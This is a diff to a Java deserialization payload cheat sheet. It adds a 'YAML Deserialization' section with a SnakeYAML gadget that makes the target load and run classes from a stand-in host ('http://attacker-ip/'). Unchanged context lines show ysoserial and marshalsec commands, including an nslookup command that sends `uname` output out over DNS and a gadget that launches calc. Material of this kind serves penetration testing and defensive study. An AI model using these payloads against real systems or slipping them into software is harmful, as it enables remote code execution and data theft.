@@ -10,6 +10,7 @@
     * [Ysoserial](#ysoserial)
     * [Burp extensions using ysoserial](#burp-extensionsl)
     * [Alternative Tooling](#alternative-tooling)
+* [YAML Deserialization](#yaml-deserialization)
 * [References](#references)
 
 
@@ -100,7 +101,7 @@ java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | b
   python yss_url.py yss_new.bin
   java -cp JavaSerializationTestSuite DeSerial yss_new.bin
   ```
-- [mbechler/marshalsec](https://github.com/mbechler/marshalsec) - Turning your data into code execution
+- [mbechler/marshalsec](https://github.com/mbechler/marshalsec) - Java Unmarshaller Security - Turning your data into code execution
   ```java
   $ java -cp marshalsec.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]
   $ java -cp marshalsec.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"
@@ -129,6 +130,21 @@ Payload generators for the following marshallers are included:
 | SnakeYAML                       | **JDK only RCEs** |
 | XStream                         | **JDK only RCEs** |
 | YAMLBeans                       | third party RCE |
+
+
+
+## YAML Deserialization
+
+SnakeYAML
+
+```yaml
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://attacker-ip/"]
+  ]]
+]
+```
+
 
 
 ## References
